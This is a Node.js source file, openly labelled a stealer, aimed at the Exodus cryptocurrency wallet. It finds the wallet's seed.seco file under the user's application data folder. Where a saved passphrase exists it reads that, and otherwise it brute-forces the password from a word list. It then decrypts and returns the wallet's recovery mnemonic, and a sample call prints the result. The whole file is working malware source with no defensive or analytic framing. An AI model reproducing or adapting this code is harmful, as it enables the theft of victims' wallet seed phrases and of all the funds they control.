const seco = require("seco-file");
const zlib = require("zlib");
const bs = require("bitcoin-seed");
const fs = require("fs");
const path = require("path");

function shrink(buffer) {
    const size = buffer.readUInt32BE(0);
    return buffer.slice(4, 4 + size);
}

function decrypt(secoPath, password) {
    const fileBuffer = fs.readFileSync(secoPath);
    const decrypted = seco.decryptData(fileBuffer, password).data;
    const shrinked = shrink(decrypted);
    const gunzipped = zlib.gunzipSync(shrinked);
    return bs.fromBuffer(gunzipped).mnemonicString;
}

function locateExodus() {
    const exodusDir = path.resolve(process.env.APPDATA, "exodus", "exodus.wallet");
    const seedPath = path.join(exodusDir, "seed.seco");
    const passphrasePath = path.join(exodusDir, "passphrase.json");

    if (fs.existsSync(seedPath)) {
        return {
            found: true,
            seedPath,
            passphrasePath,
            passwordRequired: !fs.existsSync(passphrasePath),
        };
    }
    return { found: false };
}

function bruteForcePassword(seedPath, passwordList) {
    const seedBuffer = fs.readFileSync(seedPath);
    const uniquePasswords = [...new Set(passwordList.filter(p => p.length > 4))];

    const start = process.hrtime();
    let tried = 0;

    for (const password of uniquePasswords) {
        try {
            seco.decryptData(seedBuffer, password);
            const [sec, nano] = process.hrtime(start);
            return {
                success: true,
                password,
                tried,
                time: `${sec} seconds and ${nano / 1e6} milliseconds`
            };
        } catch {
            tried++;
        }
    }

    return { success: false, tried, error: "Password not found in list." };
}

function exodusStealer(passwords) {
    const exodusInfo = locateExodus();

    if (!exodusInfo.found) {
        return { found: false };
    }

    if (!exodusInfo.passwordRequired) {
        const passphrase = JSON.parse(fs.readFileSync(exodusInfo.passphrasePath, "utf8")).passphrase;
        const mnemonic = decrypt(exodusInfo.seedPath, passphrase);
        return { found: true, mnemonic };
    }

    const brute = bruteForcePassword(exodusInfo.seedPath, passwords);

    if (brute.success) {
        const mnemonic = decrypt(exodusInfo.seedPath, brute.password);
        return {
            found: true,
            mnemonic,
            password: brute.password,
            time: brute.time,
            tried: brute.tried
        };
    }

    return { found: true, error: brute.error, tried: brute.tried };
}

function readPasswordList(filePath) {
    return fs.readFileSync(filePath, "utf8")
        .split(/\r?\n/)
        .filter(line => line.trim().length > 0);
}

// Example usage:
const passwords = readPasswordList("list.txt");
const result = exodusStealer(passwords);

console.log(result);

module.exports = {
    locateExodus,
    bruteForcePassword,
    exodusStealer,
    readPasswordList,
    decrypt
};
